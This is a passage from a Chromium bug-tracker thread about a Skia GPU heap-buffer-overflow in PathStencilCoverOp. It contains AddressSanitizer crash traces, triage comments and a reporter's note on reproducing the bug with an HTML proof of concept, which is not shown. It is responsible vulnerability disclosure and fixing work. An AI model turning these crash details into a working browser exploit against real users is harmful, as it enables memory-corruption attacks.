    #16 0x6399892e9007 in skgpu::ganesh::Flush(SkSurface*) third_party/skia/src/gpu/ganesh/surface/SkSurface_Ganesh.cpp:759:45
    #17 0x6399907d572f in gpu::SharedContextState::FlushWriteAccess(gpu::SkiaImageRepresentation::ScopedWriteAccess*) gpu/command_buffer/service/shared_context_state.cc:860:9
    #18 0x639990a935c7 in gpu::raster::RasterDecoderImpl::DoEndRasterCHROMIUM() gpu/command_buffer/service/raster_decoder.cc:3085:30
    #19 0x639990a8dade in gpu::raster::RasterDecoderImpl::HandleEndRasterCHROMIUM(unsigned int, void const volatile*) gpu/command_buffer/service/raster_decoder_autogen.h:151:3
    #20 0x639990a9869b in gpu::error::Error gpu::raster::RasterDecoderImpl::DoCommandsImpl<false>(unsigned int, void const volatile*, int, int*) gpu/command_buffer/service/raster_decoder.cc:1512:18
    #21 0x63997a135804 in gpu::CommandBufferService::Flush(int, gpu::AsyncAPIInterface*) gpu/command_buffer/service/command_buffer_service.cc:267:35
    #22 0x6399902080db in gpu::CommandBufferStub::OnAsyncFlush(int, unsigned int, std::__Cr::vector<gpu::SyncToken, std::__Cr::allocator<gpu::SyncToken>> const&) gpu/ipc/service/command_buffer_stub.cc:504:22
    #23 0x639990207341 in gpu::CommandBufferStub::ExecuteDeferredRequest(gpu::mojom::DeferredCommandBufferRequestParams&, gpu::FenceSyncReleaseDelegate*) gpu/ipc/service/command_buffer_stub.cc:173:7
    #24 0x63999022a45c in gpu::GpuChannel::ExecuteDeferredRequest(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*) gpu/ipc/service/gpu_channel.cc:833:13
    #25 0x639990238447 in void base::internal::DecayedFunctorTraits<void (gpu::GpuChannel::*)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*), base::WeakPtr<gpu::GpuChannel>&&, mojo::StructPtr<gpu::mojom::DeferredRequestParams>&&>::Invoke<void (gpu::GpuChannel::*)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*), base::WeakPtr<gpu::GpuChannel> const&, mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*>(void (gpu::GpuChannel::*)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*), base::WeakPtr<gpu::GpuChannel> const&, mojo::StructPtr<gpu::mojom::DeferredRequestParams>&&, gpu::FenceSyncReleaseDelegate*&&) base/functional/bind_internal.h:740:12
    #26 0x639990238229 in base::internal::Invoker<base::internal::FunctorTraits<void (gpu::GpuChannel::*&&)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*), base::WeakPtr<gpu::GpuChannel>&&, mojo::StructPtr<gpu::mojom::DeferredRequestParams>&&>, base::internal::BindState<true, true, false, void (gpu::GpuChannel::*)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*), base::WeakPtr<gpu::GpuChannel>, mojo::StructPtr<gpu::mojom::DeferredRequestParams>>, void (gpu::FenceSyncReleaseDelegate*)>::RunOnce(base::internal::BindStateBase*, gpu::FenceSyncReleaseDelegate*) base/functional/bind_internal.h:956:5
    #27 0x63997a178201 in void base::internal::Invoker<base::internal::FunctorTraits<base::OnceCallback<void (gpu::FenceSyncReleaseDelegate*)>&&, gpu::FenceSyncReleaseDelegate*>, base::internal::BindState<false, true, true, base::OnceCallback<void (gpu::FenceSyncReleaseDelegate*)>, base::internal::UnretainedWrapper<gpu::FenceSyncReleaseDelegate, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>>, void ()>::RunImpl<base::OnceCallback<void (gpu::FenceSyncReleaseDelegate*)>, std::__Cr::tuple<base::internal::UnretainedWrapper<gpu::FenceSyncReleaseDelegate, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>>, 0ul>(base::OnceCallback<void (gpu::FenceSyncReleaseDelegate*)>&&, std::__Cr::tuple<base::internal::UnretainedWrapper<gpu::FenceSyncReleaseDelegate, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>>&&, std::__Cr::integer_sequence<unsigned long, 0ul>) base/functional/callback.h:155:12

SUMMARY: AddressSanitizer: heap-buffer-overflow third_party/skia/src/gpu/BufferWriter.h:92:9 in skgpu::ganesh::PathStencilCoverOp::onPrepare(GrOpFlushState*)
Shadow bytes around the buggy address:
  0x72ba1896f580: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x72ba1896f600: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x72ba1896f680: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x72ba1896f700: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x72ba1896f780: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x72ba1896f800: 00 00 00 00[fa]fa fa fa fa fa fa fa fa fa fa fa
  0x72ba1896f880: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x72ba1896f900: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x72ba1896f980: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x72ba1896fa00: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x72ba1896fa80: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb

==15756==ADDITIONAL INFO

==15756==Note: Please include this section with the ASan report.
Task trace:
    #0 0x63997a14ae52 in gpu::Scheduler::RunNextTask() gpu/command_buffer/service/scheduler.cc:647:27
    #1 0x63997a14ae52 in gpu::Scheduler::RunNextTask() gpu/command_buffer/service/scheduler.cc:647:27
    #2 0x63997a14ae52 in gpu::Scheduler::RunNextTask() gpu/command_buffer/service/scheduler.cc:647:27
    #3 0x63997a14ae52 in gpu::Scheduler::RunNextTask() gpu/command_buffer/service/scheduler.cc:647:27


Command line: `/proc/self/exe --type=gpu-process --no-sandbox --enable-gpu-rasterization --disable-skia-graphite --ozone-platform=wayland --render-node-override=/dev/dri/renderD128 --crashpad-handler-pid=15040 --enable-crash-reporter=, --disable-breakpad --change-stack-guard-on-fork=enable --gpu-preferences=UAAAAAAAAAAgAQAMAAAAAAAAAAAAAMAAAQAAAAAAAAAAAAAAAAAAABARAAAAAAAAAAAAAAAAAAAAYAAAAAAAAABgAAAAAAAAAAAAAAAAAAABARAAAAAAAAAAgAAAAAAAAA --shared-files --metrics-shmem-handle=4,i,16416884823919462376,14178352278106582645,262144 --field-trial-handle=3,i,1065319797526636146,7725492769041559239,262144 --disable-features=EyeDropper --variations-seed-version --pseudonymization-salt-handle=7,i,14663162623263158245,3497144085525861933,4 --trace-process-track-uuid=3190708996619331833`


==15756==END OF ADDITIONAL INFO

==15756==ABORTING
[15036:15036:0310/103034.512719:ERROR:content/browser/gpu/gpu_process_host.cc:999] GPU process exited unexpectedly: exit_code=256
[15036:15060:0310/103037.551852:ERROR:google_apis/gcm/engine/registration_request.cc:291] Registration response error message: DEPRECATED_ENDPOINT                                                      [15036:15060:0310/103058.852511:ERROR:google_apis/gcm/engine/registration_request.cc:291] Registration response error message: DEPRECATED_ENDPOINT


```

### ns...@chromium.org (2026-03-11)

egdaniel@, please take a look. I'm not sure if this is related to (or a dupe of) [issue 491421267](https://issues.chromium.org/issues/491421267) or not, the traces look different to me.

### eg...@google.com (2026-03-11)

It is a different issue. Passing over to Michael to look at or triage to the GPU team

### ns...@chromium.org (2026-03-11)

Michael, could you confirm the affected OSs? I verified Linux, but I don't think ClusterFuzz will be able to repro this so the other OSs are an educated guess on my part.

### ns...@chromium.org (2026-03-11)

I wasn't able to repro on 146, but there is some non determinism to the poc. 147.0.7719.0 does repro. Tentatively assigning FoundIn 147, please correct after root cause analysis if needed.

### mi...@google.com (2026-03-11)

This should be fixed by <https://skia-review.git.corp.google.com/c/skia/+/1184756> but I typo'ed the bug id.

### mi...@google.com (2026-03-11)

Yes, it could impact any OS

### ch...@google.com (2026-03-12)

Setting milestone because of s0/s1 severity.

### qq...@calif.io (2026-03-17)

Hello,

I can repro on chromium-146.0.7680.75-linux-asan using new attached PoC. I think it is mostly the non-determinism as you said. The new PoC just overshoot the math there + more aggressive.

```
 ASAN_OPTIONS=detect_leaks=0:symbolize=1:fast_unwind_on_malloc=0:external_symbolizer_path=../chrome_stable_146/llvm-symbolizer  \
  ../chrome_stable_146/chrome \
    --no-sandbox \
    --disable-skia-graphite \
    --enable-gpu-rasterization \
    --ignore-gpu-blocklist \
    /home/pop/sec/chromium/src/skia_poc_chrome_147/atlas_path_positive_wrap_poc.html
WARNING: radv is not a conformant Vulkan implementation, testing use only.
[128881:128881:0317/155626.914416:ERROR:base/memory/shared_memory_switch.cc:289] Failed global descriptor lookup: 7
[128880:128880:0317/155627.144937:ERROR:ui/ozone/platform/wayland/gpu/wayland_surface_factory.cc:251] '--ozone-platform=wayland' is not compatible with Vulkan. Consider switching to '--ozone-platform=x11' or disabling Vulkan
WARNING: radv is not a conformant Vulkan implementation, testing use only.
[128806:128835:0317/155731.249469:ERROR:google_apis/gcm/engine/registration_request.cc:291] Registration response error message: DEPRECATED_ENDPOINT
=================================================================
==128880==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x766f49554820 at pc 0x5f250f84db2e bp 0x7fff5c9e1890 sp 0x7fff5c9e1888
WRITE of size 8 at 0x766f49554820 thread T0 (chrome)
    #0 0x5f250f84db2d in skgpu::ganesh::PathStencilCoverOp::onPrepare(GrOpFlushState*) third_party/skia/src/gpu/BufferWriter.h:92:9
    #1 0x5f250f8013f2 in GrOp::prepare(GrOpFlushState*) third_party/skia/src/gpu/ganesh/ops/GrOp.cpp:59:11
    #2 0x5f250f84028a in skgpu::ganesh::OpsTask::onPrepare(GrOpFlushState*) third_party/skia/src/gpu/ganesh/ops/OpsTask.cpp:548:27
    #3 0x5f250f62b68a in GrRenderTask::prepare(GrOpFlushState*) third_party/skia/src/gpu/ganesh/GrRenderTask.cpp:111:11
    #4 0x5f250f5c5d7b in GrDrawingManager::executeRenderTasks(GrOpFlushState*) third_party/skia/src/gpu/ganesh/GrDrawingManager.cpp:266:21
    #5 0x5f250f5c4223 in GrDrawingManager::flush(SkSpan<GrSurfaceProxy*>, SkSurfaces::BackendSurfaceAccess, GrFlushInfo const&, skgpu::MutableTextureState const*) third_party/skia/src/gpu/ganesh/GrDrawingManager.cpp:209:34
    #6 0x5f250f5c71e0 in GrDrawingManager::flushSurfaces(SkSpan<GrSurfaceProxy*>, SkSurfaces::BackendSurfaceAccess, GrFlushInfo const&, skgpu::MutableTextureState const*) third_party/skia/src/gpu/ganesh/GrDrawingManager.cpp:540:27
    #7 0x5f250f55d988 in GrDirectContext::flushAndSubmit(GrSyncCpu) third_party/skia/src/gpu/ganesh/GrDirectContext.cpp:448:36
    #8 0x5f250f55e54d in GrDirectContext::freeGpuResources() third_party/skia/src/gpu/ganesh/GrDirectContext.cpp:227:11
    #9 0x5f2516d45450 in gpu::raster::GrCacheController::PurgeGrCache(unsigned long) gpu/command_buffer/service/gr_cache_controller.cc:114:35
    #10 0x5f2516d45ba9 in base::internal::Invoker<base::internal::FunctorTraits<void (gpu::raster::GrCacheController::*&&)(unsigned long), gpu::raster::GrCacheController*, unsigned long&&>, base::internal::BindState<true, true, false, void (gpu::raster::GrCacheController::*)(unsigned long), base::internal::UnretainedWrapper<gpu::raster::GrCacheController, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>, unsigned long>, void ()>::RunOnce(base::internal::BindStateBase*) base/functional/bind_internal.h:740:12
    #11 0x5f24f688bd86 in void base::internal::CancelableCallbackImpl<base::OnceCallback<void ()>>::ForwardOnce<>() base/functional/callback.h:155:12
    #12 0x5f24f688c050 in base::internal::Invoker<base::internal::FunctorTraits<void (base::internal::CancelableCallbackImpl<base::OnceCallback<void ()>>::*&&)(), base::WeakPtr<base::internal::CancelableCallbackImpl<base::OnceCallback<void ()>>>&&>, base::internal::BindState<true, true, false, void (base::internal::CancelableCallbackImpl<base::OnceCallback<void ()>>::*)(), base::WeakPtr<base::internal::CancelableCallbackImpl<base::OnceCallback<void ()>>>>, void ()>::RunOnce(base::internal::BindStateBase*) base/functional/bind_internal.h:740:12
    #13 0x5f250d2f6d26 in base::TaskAnnotator::RunTaskImpl(base::PendingTask&) base/functional/callback.h:155:12
    #14 0x5f250d36e167 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*) base/task/common/task_annotator.h:112:5
    #15 0x5f250d36d03a in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:346:40
    #16 0x5f250d1b7799 in base::MessagePumpDefault::Run(base::MessagePump::Delegate*) base/message_loop/message_pump_default.cc:42:55
    #17 0x5f250d36f857 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool, base::TimeDelta) base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:647:12
    #18 0x5f250d271fd0 in base::RunLoop::Run(base::Location const&) base/run_loop.cc:135:14
    #19 0x5f2518b34c5c in content::GpuMain(content::MainFunctionParams) content/gpu/gpu_main.cc:479:14
    #20 0x5f250902a4ef in content::RunZygote(content::ContentMainDelegate*) content/app/content_main_runner_impl.cc:664:14
    #21 0x5f250902b800 in content::RunOtherNamedProcessTypeMain(std::__Cr::basic_string<char, std::__Cr::char_traits<char>, std::__Cr::allocator<char>> const&, content::MainFunctionParams, content::ContentMainDelegate*) content/app/content_main_runner_impl.cc:771:12
    #22 0x5f250902e428 in content::ContentMainRunnerImpl::Run() content/app/content_main_runner_impl.cc:1147:10
    #23 0x5f2509027f01 in content::RunContentProcess(content::ContentMainParams, content::ContentMainRunner*) content/app/content_main.cc:358:36
    #24 0x5f25090284fc in content::ContentMain(content::ContentMainParams) content/app/content_main.cc:371:10
    #25 0x5f24f5f0e279 in ChromeMain chrome/app/chrome_main.cc:191:12
    #26 0x7a6f9a82a1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #27 0x7a6f9a82a28a in __libc_start_main csu/../csu/libc-start.c:360:3
    #28 0x5f24f5e31029 in _start (/home/pop/sec/chromium/chrome_stable_146/chrome+0x10c27029) (BuildId: 46d49f5b6958dc43)

0x766f49554820 is located 0 bytes after 4294967328-byte region [0x766e49554800,0x766f49554820)
allocated by thread T0 (chrome) here:
    #0 0x5f24f5f0cb3d in operator new(unsigned long) (/home/pop/sec/chromium/chrome_stable_146/chrome+0x10d02b3d) (BuildId: 46d49f5b6958dc43)
    #1 0x5f250f5d1d81 in GrBufferAllocPool::CpuBufferCache::makeBuffer(unsigned long, bool) third_party/skia/src/gpu/ganesh/GrCpuBuffer.h:29:20
    #2 0x5f250f5d2d9d in GrBufferAllocPool::resetCpuData(unsigned long) third_party/skia/src/gpu/ganesh/GrBufferAllocPool.cpp:389:60
    #3 0x5f250f5d4904 in GrBufferAllocPool::createBlock(unsigned long) third_party/skia/src/gpu/ganesh/GrBufferAllocPool.cpp:362:15
    #4 0x5f250f5d3cbe in GrBufferAllocPool::makeSpace(unsigned long, unsigned long, sk_sp<GrBuffer const>*, unsigned long*) third_party/skia/src/gpu/ganesh/GrBufferAllocPool.cpp:229:16
    #5 0x5f250f5d60f8 in GrVertexBufferAllocPool::makeSpace(unsigned long, int, sk_sp<GrBuffer const>*, int*) third_party/skia/src/gpu/ganesh/GrBufferAllocPool.cpp:445:28
    #6 0x5f250f850399 in GrEagerDynamicVertexAllocator::lock(unsigned long, int) third_party/skia/src/gpu/ganesh/GrEagerVertexAllocator.cpp:20:31
    #7 0x5f250f84c340 in skgpu::ganesh::PathStencilCoverOp::onPrepare(GrOpFlushState*) third_party/skia/src/gpu/ganesh/GrEagerVertexAllocator.h:39:25
    #8 0x5f250f8013f2 in GrOp::prepare(GrOpFlushState*) third_party/skia/src/gpu/ganesh/ops/GrOp.cpp:59:11
    #9 0x5f250f84028a in skgpu::ganesh::OpsTask::onPrepare(GrOpFlushState*) third_party/skia/src/gpu/ganesh/ops/OpsTask.cpp:548:27
    #10 0x5f250f62b68a in GrRenderTask::prepare(GrOpFlushState*) third_party/skia/src/gpu/ganesh/GrRenderTask.cpp:111:11
    #11 0x5f250f5c5d7b in GrDrawingManager::executeRenderTasks(GrOpFlushState*) third_party/skia/src/gpu/ganesh/GrDrawingManager.cpp:266:21
    #12 0x5f250f5c4223 in GrDrawingManager::flush(SkSpan<GrSurfaceProxy*>, SkSurfaces::BackendSurfaceAccess, GrFlushInfo const&, skgpu::MutableTextureState const*) third_party/skia/src/gpu/ganesh/GrDrawingManager.cpp:209:34
    #13 0x5f250f5c71e0 in GrDrawingManager::flushSurfaces(SkSpan<GrSurfaceProxy*>, SkSurfaces::BackendSurfaceAccess, GrFlushInfo const&, skgpu::MutableTextureState const*) third_party/skia/src/gpu/ganesh/GrDrawingManager.cpp:540:27
    #14 0x5f250f55d988 in GrDirectContext::flushAndSubmit(GrSyncCpu) third_party/skia/src/gpu/ganesh/GrDirectContext.cpp:448:36
    #15 0x5f250f55e54d in GrDirectContext::freeGpuResources() third_party/skia/src/gpu/ganesh/GrDirectContext.cpp:227:11
    #16 0x5f2516d45450 in gpu::raster::GrCacheController::PurgeGrCache(unsigned long) gpu/command_buffer/service/gr_cache_controller.cc:114:35
    #17 0x5f2516d45ba9 in base::internal::Invoker<base::internal::FunctorTraits<void (gpu::raster::GrCacheController::*&&)(unsigned long), gpu::raster::GrCacheController*, unsigned long&&>, base::internal::BindState<true, true, false, void (gpu::raster::GrCacheController::*)(unsigned long), base::internal::UnretainedWrapper<gpu::raster::GrCacheController, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>, unsigned long>, void ()>::RunOnce(base::internal::BindStateBase*) base/functional/bind_internal.h:740:12
    #18 0x5f24f688bd86 in void base::internal::CancelableCallbackImpl<base::OnceCallback<void ()>>::ForwardOnce<>() base/functional/callback.h:155:12
    #19 0x5f24f688c050 in base::internal::Invoker<base::internal::FunctorTraits<void (base::internal::CancelableCallbackImpl<base::OnceCallback<void ()>>::*&&)(), base::WeakPtr<base::internal::CancelableCallbackImpl<base::OnceCallback<void ()>>>&&>, base::internal::BindState<true, true, false, void (base::internal::CancelableCallbackImpl<base::OnceCallback<void ()>>::*)(), base::WeakPtr<base::internal::CancelableCallbackImpl<base::OnceCallback<void ()>>>>, void ()>::RunOnce(base::internal::BindStateBase*) base/functional/bind_internal.h:740:12
    #20 0x5f250d2f6d26 in base::TaskAnnotator::RunTaskImpl(base::PendingTask&) base/functional/callback.h:155:12
    #21 0x5f250d36e167 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*) base/task/common/task_annotator.h:112:5
    #22 0x5f250d36d03a in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:346:40
    #23 0x5f250d1b7799 in base::MessagePumpDefault::Run(base::MessagePump::Delegate*) base/message_loop/message_pump_default.cc:42:55
    #24 0x5f250d36f857 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool, base::TimeDelta) base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:647:12
    #25 0x5f250d271fd0 in base::RunLoop::Run(base::Location const&) base/run_loop.cc:135:14
    #26 0x5f2518b34c5c in content::GpuMain(content::MainFunctionParams) content/gpu/gpu_main.cc:479:14
    #27 0x5f250902a4ef in content::RunZygote(content::ContentMainDelegate*) content/app/content_main_runner_impl.cc:664:14

SUMMARY: AddressSanitizer: heap-buffer-overflow third_party/skia/src/gpu/BufferWriter.h:92:9 in skgpu::ganesh::PathStencilCoverOp::onPrepare(GrOpFlushState*)
Shadow bytes around the buggy address:
  0x766f49554580: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x766f49554600: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x766f49554680: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x766f49554700: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x766f49554780: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x766f49554800: 00 00 00 00[fa]fa fa fa fa fa fa fa fa fa fa fa
  0x766f49554880: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x766f49554900: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x766f49554980: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x766f49554a00: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x766f49554a80: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb

==128880==ADDITIONAL INFO

==128880==Note: Please include this section with the ASan report.
Task trace:
    #0 0x5f2516d44cf3 in gpu::raster::GrCacheController::ScheduleGrContextCleanup() gpu/command_buffer/service/gr_cache_controller.cc:60:33
    #1 0x5f2516d44cf3 in gpu::raster::GrCacheController::ScheduleGrContextCleanup() gpu/command_buffer/service/gr_cache_controller.cc:60:33
    #2 0x5f2516d658be in gpu::ServiceTransferCache::MaybePostPruneOldEntries() gpu/command_buffer/service/service_transfer_cache.cc:353:34
    #3 0x5f2516d658be in gpu::ServiceTransferCache::MaybePostPruneOldEntries() gpu/command_buffer/service/service_transfer_cache.cc:353:34


Command line: `/proc/self/exe --type=gpu-process --no-sandbox --enable-gpu-rasterization --disable-skia-graphite --ozone-platform=wayland --render-node-override=/dev/dri/renderD128 --crashpad-handler-pid=128817 --enable-crash-reporter=, --disable-breakpad --change-stack-guard-on-fork=enable --gpu-preferences=UAAAAAAAAAAgAQAMAAAAAAAAAAAAAMAAAQAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAYAAAAAAAAABgAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAgAAAAAAAAA --shared-files --metrics-shmem-handle=4,i,4408271582407478336,13876048641066527363,262144 --field-trial-handle=3,i,67546488086748836,2062697802880037586,262144 --disable-features=EyeDropper --variations-seed-version --pseudonymization-salt-handle=7,i,15377697164023304477,13832350280839994099,4 --trace-process-track-uuid=3190708988185955192`


==128880==END OF ADDITIONAL INFO

==128880==ABORTING
[128806:128806:0317/155743.155192:ERROR:content/browser/gpu/gpu_process_host.cc:996] GPU process exited unexpectedly: exit_code=256
WARNING: radv is not a conformant Vulkan implementation, testing use only.
[130206:130206:0317/155743.553338:ERROR:ui/ozone/platform/wayland/gpu/wayland_surface_factory.cc:251] '--ozone-platform=wayland' is not compatible with Vulkan. Consider switching to '--ozone-platform=x11' or disabling Vulkan
WARNING: radv is not a conformant Vulkan implementation, testing use only.
[128978:128983:0317/155752.383981:ERROR:gpu/ipc/client/command_buffer_proxy_impl.cc:448] GPU state invalid after WaitForTokenInRange.
[128806:128835:0317/155759.464534:ERROR:google_apis/gcm/engine/registration_request.cc:291] Registration response error message: DEPRECATED_ENDPOINT
=================================================================
==130206==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x766f4cf8f820 at pc 0x5f250f84db2e bp 0x7fff5c9e1890 sp 0x7fff5c9e1888
WRITE of size 8 at 0x766f4cf8f820 thread T0 (chrome)
    #0 0x5f250f84db2d in skgpu::ganesh::PathStencilCoverOp::onPrepare(GrOpFlushState*) third_party/skia/src/gpu/BufferWriter.h:92:9
    #1 0x5f250f8013f2 in GrOp::prepare(GrOpFlushState*) third_party/skia/src/gpu/ganesh/ops/GrOp.cpp:59:11
    #2 0x5f250f84028a in skgpu::ganesh::OpsTask::onPrepare(GrOpFlushState*) third_party/skia/src/gpu/ganesh/ops/OpsTask.cpp:548:27
    #3 0x5f250f62b68a in GrRenderTask::prepare(GrOpFlushState*) third_party/skia/src/gpu/ganesh/GrRenderTask.cpp:111:11
    #4 0x5f250f5c5d7b in GrDrawingManager::executeRenderTasks(GrOpFlushState*) third_party/skia/src/gpu/ganesh/GrDrawingManager.cpp:266:21
    #5 0x5f250f5c4223 in GrDrawingManager::flush(SkSpan<GrSurfaceProxy*>, SkSurfaces::BackendSurfaceAccess, GrFlushInfo const&, skgpu::MutableTextureState const*) third_party/skia/src/gpu/ganesh/GrDrawingManager.cpp:209:34
    #6 0x5f250f5c71e0 in GrDrawingManager::flushSurfaces(SkSpan<GrSurfaceProxy*>, SkSurfaces::BackendSurfaceAccess, GrFlushInfo const&, skgpu::MutableTextureState const*) third_party/skia/src/gpu/ganesh/GrDrawingManager.cpp:540:27
    #7 0x5f250f55d988 in GrDirectContext::flushAndSubmit(GrSyncCpu) third_party/skia/src/gpu/ganesh/GrDirectContext.cpp:448:36
    #8 0x5f250f55e54d in GrDirectContext::freeGpuResources() third_party/skia/src/gpu/ganesh/GrDirectContext.cpp:227:11
    #9 0x5f2516d45450 in gpu::raster::GrCacheController::PurgeGrCache(unsigned long) gpu/command_buffer/service/gr_cache_controller.cc:114:35
    #10 0x5f2516d45ba9 in base::internal::Invoker<base::internal::FunctorTraits<void (gpu::raster::GrCacheController::*&&)(unsigned long), gpu::raster::GrCacheController*, unsigned long&&>, base::internal::BindState<true, true, false, void (gpu::raster::GrCacheController::*)(unsigned long), base::internal::UnretainedWrapper<gpu::raster::GrCacheController, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>, unsigned long>, void ()>::RunOnce(base::internal::BindStateBase*) base/functional/bind_internal.h:740:12
    #11 0x5f24f688bd86 in void base::internal::CancelableCallbackImpl<base::OnceCallback<void ()>>::ForwardOnce<>() base/functional/callback.h:155:12
    #12 0x5f24f688c050 in base::internal::Invoker<base::internal::FunctorTraits<void (base::internal::CancelableCallbackImpl<base::OnceCallback<void ()>>::*&&)(), base::WeakPtr<base::internal::CancelableCallbackImpl<base::OnceCallback<void ()>>>&&>, base::internal::BindState<true, true, false, void (base::internal::CancelableCallbackImpl<base::OnceCallback<void ()>>::*)(), base::WeakPtr<base::internal::CancelableCallbackImpl<base::OnceCallback<void ()>>>>, void ()>::RunOnce(base::internal::BindStateBase*) base/functional/bind_internal.h:740:12
    #13 0x5f250d2f6d26 in base::TaskAnnotator::RunTaskImpl(base::PendingTask&) base/functional/callback.h:155:12
    #14 0x5f250d36e167 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*) base/task/common/task_annotator.h:112:5
    #15 0x5f250d36d03a in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:346:40
    #16 0x5f250d1b7799 in base::MessagePumpDefault::Run(base::MessagePump::Delegate*) base/message_loop/message_pump_default.cc:42:55
    #17 0x5f250d36f857 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool, base::TimeDelta) base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:647:12
    #18 0x5f250d271fd0 in base::RunLoop::Run(base::Location const&) base/run_loop.cc:135:14
    #19 0x5f2518b34c5c in content::GpuMain(content::MainFunctionParams) content/gpu/gpu_main.cc:479:14
    #20 0x5f250902a4ef in content::RunZygote(content::ContentMainDelegate*) content/app/content_main_runner_impl.cc:664:14
    #21 0x5f250902b800 in content::RunOtherNamedProcessTypeMain(std::__Cr::basic_string<char, std::__Cr::char_traits<char>, std::__Cr::allocator<char>> const&, content::MainFunctionParams, content::ContentMainDelegate*) content/app/content_main_runner_impl.cc:771:12
    #22 0x5f250902e428 in content::ContentMainRunnerImpl::Run() content/app/content_main_runner_impl.cc:1147:10
    #23 0x5f2509027f01 in content::RunContentProcess(content::ContentMainParams, content::ContentMainRunner*) content/app/content_main.cc:358:36
    #24 0x5f25090284fc in content::ContentMain(content::ContentMainParams) content/app/content_main.cc:371:10
    #25 0x5f24f5f0e279 in ChromeMain chrome/app/chrome_main.cc:191:12
    #26 0x7a6f9a82a1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #27 0x7a6f9a82a28a in __libc_start_main csu/../csu/libc-start.c:360:3
    #28 0x5f24f5e31029 in _start (/home/pop/sec/chromium/chrome_stable_146/chrome+0x10c27029) (BuildId: 46d49f5b6958dc43)

0x766f4cf8f820 is located 0 bytes after 17179869216-byte region [0x766b4cf8f800,0x766f4cf8f820)
allocated by thread T0 (chrome) here:
    #0 0x5f24f5f0cb3d in operator new(unsigned long) (/home/pop/sec/chromium/chrome_stable_146/chrome+0x10d02b3d) (BuildId: 46d49f5b6958dc43)
    #1 0x5f250f5d1d81 in GrBufferAllocPool::CpuBufferCache::makeBuffer(unsigned long, bool) third_party/skia/src/gpu/ganesh/GrCpuBuffer.h:29:20
